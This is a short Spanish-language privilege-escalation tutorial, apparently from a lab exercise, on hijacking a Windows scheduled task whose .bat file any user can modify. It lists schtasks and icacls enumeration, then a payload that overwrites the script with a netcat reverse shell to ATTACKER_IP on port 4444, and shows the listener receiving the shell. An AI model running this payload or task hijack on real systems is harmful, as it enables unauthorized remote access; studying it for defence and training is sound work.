# Otras escaladas

### Tareas programadas

Al examinar las tareas programadas en el la maquina victima, es posible que veas una tarea programada que ha perdido su binario o que directamente está utilizando un binario que puede modificar. Pueden listarse desde la línea de comandos: `schtasks`

`schtasks /query /tn vulntask /fo list /v`

```
C:\> schtasks /query /tn vulntask /fo list /v 

Folder: \ 
HostName:       PC1 
TaskName:       \vulntask 
Task To Run:    C:\tasks\schtask.bat 
Run As User:    taskusr1
```

Para comprobar los permisos de archivo, `icacls` :

```
C:\> icacls c:\tasks\schtask.bat 
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F) 
	BUILTIN\Administrators:(I)(F) 
	BUILTIN\Users:(I)(F)
```

> El grupo **BUILTIN\Users** tiene acceso completo **(F)** sobre el binario de la tarea. Esto significa que podemos modificar el archivo .bat e insertar el payload que queramos

Payload --> `C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`

Nos pondríamos en escucha con netcat en nuestra maquina `nc -lvp 4444`

```
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```
